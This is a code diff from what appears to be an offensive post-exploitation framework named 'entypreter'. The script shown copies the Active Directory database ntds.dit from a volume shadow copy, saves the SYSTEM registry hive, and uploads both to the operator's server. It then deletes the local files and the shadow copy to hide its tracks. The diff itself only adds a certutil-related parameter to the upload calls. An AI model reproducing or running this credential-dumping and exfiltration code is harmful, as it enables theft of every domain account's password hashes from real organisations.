@@ -13,12 +13,12 @@ try {
 
     //entypreter.shell.run("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, false);
     var unused = entypreter.shell.exec("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, "~RPATH~\\~NTDSFILE~2.txt");
-    entypreter.http.upload(ntds_path, "~NTDSFILE~", "~UUIDHEADER~");
+    entypreter.http.upload(ntds_path, "~NTDSFILE~", ~CERTUTIL~, "~UUIDHEADER~");
     entypreter.file.deleteFile(ntds_path);
 
     // step 2. create, send SYSTEM hive, delete
     entypreter.shell.run("reg save HKLM\\SYSTEM " + sysh_path + " /y", false);
-    entypreter.http.upload(sysh_path, "~SYSHFILE~", "~UUIDHEADER~");
+    entypreter.http.upload(sysh_path, "~SYSHFILE~", ~CERTUTIL~, "~UUIDHEADER~");
     entypreter.file.deleteFile(sysh_path);
     var discard = entypreter.shell.exec("vssadmin delete shadows /shadow="+shadowid+" /quiet", "~RPATH~\\"+entypreter.uuid()+".txt");
 
